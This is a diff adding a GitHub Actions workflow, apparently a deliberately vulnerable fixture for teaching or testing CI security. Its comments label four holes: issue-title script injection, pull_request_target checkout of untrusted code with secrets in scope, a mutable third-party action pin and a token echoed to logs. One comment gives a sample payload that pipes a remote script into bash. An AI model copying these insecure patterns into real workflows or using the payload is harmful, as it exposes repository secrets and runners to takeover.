@@ -1,0 +1,36 @@
+name: CI
+
+on:
+  issues:
+    types: [opened]
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # VULN 1: Script injection — an untrusted issue title is interpolated
+      # directly into a shell `run` block. A title like `$(curl evil.sh | bash)`
+      # executes on the runner.
+      - name: Greet
+        run: echo "New issue: ${{ github.event.issue.title }}"
+
+      # VULN 2: pull_request_target + checkout of the untrusted PR head means
+      # attacker-controlled code is built while repository secrets are in scope
+      # (secret exfiltration / RCE on a privileged runner).
+      - uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Install and test
+        run: npm install && npm test
+        env:
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+
+      # VULN 3: Third-party action pinned to a mutable branch — a compromised
+      # upstream immediately runs with this workflow's permissions.
+      - uses: some-org/deploy-action@main
+
+      # VULN 4: Secret written to the build log in cleartext.
+      - name: Deploy
+        run: echo "deploying with token=${{ secrets.DEPLOY_TOKEN }}"
